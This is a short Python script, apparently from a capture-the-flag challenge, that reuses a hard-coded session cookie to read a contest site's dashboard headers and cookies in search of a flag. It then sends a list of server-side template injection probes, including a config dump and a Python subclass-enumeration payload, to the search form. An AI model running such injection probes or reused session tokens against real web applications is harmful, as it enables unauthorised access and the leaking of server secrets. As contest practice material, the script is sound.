import requests
from bs4 import BeautifulSoup
import re

base_url = "https://poiuytrewqas-csc26.cybersecuritychallenge.al"
session = requests.Session()
session.cookies.set('session', 'eyJ1c2VyIjoiYWxwZXRnIn0.aXymyw.GBEYMO9Mn9kpHr1J86YGyGs4CsE')

print("[+] Getting dashboard with full headers...")
response = session.get(f"{base_url}/dashboard")

print("\n[*] Response Headers:")
for header, value in response.headers.items():
    print(f"    {header}: {value}")
    if "CSC26{" in value:
        print(f"\n🚩 FLAG IN HEADER {header}: {value}")

print("\n[*] Cookies:")
for cookie in session.cookies:
    print(f"    {cookie.name}: {cookie.value}")
    if "CSC26{" in cookie.value:
        print(f"\n🚩 FLAG IN COOKIE!")

# Try POST to dashboard
print("\n[+] Trying POST to dashboard...")
response = session.post(f"{base_url}/dashboard", data={})
print(f"Status: {response.status_code}")
print(response.text[:500])

# Check search with empty query
print("\n[+] Checking search with various payloads...")
search_url = f"{base_url}/search"

# SSTI payloads
ssti_payloads = [
    "{{7*7}}",
    "{{config}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "${7*7}",
    "<%= 7*7 %>",
]

for payload in ssti_payloads:
    response = session.post(search_url, data={"q": payload})
    if "49" in response.text or "config" in response.text.lower():
        print(f"\n[!] SSTI might work with: {payload}")
        print(response.text[:1000])
